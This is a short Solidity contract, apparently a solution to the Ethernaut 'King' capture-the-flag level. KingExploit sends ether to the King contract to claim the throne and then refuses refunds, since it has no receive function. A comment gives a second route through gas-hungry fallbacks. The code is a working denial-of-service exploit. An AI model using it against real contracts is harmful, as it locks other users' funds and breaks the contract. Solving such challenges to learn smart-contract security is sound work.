//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract KingExploit{
    King king;
    uint initialAmt;
    constructor(address payable _kingAddr) payable{
        king = King(_kingAddr);
        initialAmt = msg.value;
    }

    //An alternative way to have exploited this function would have been to have our fallback() or receive()
    //Require more gas than the set allocated 2300 that transfer provides by default
    function exploit()public{

        (bool sent, ) = address(king).call{value:initialAmt}("");
        require(sent, "Failed to send Ether");
    }
}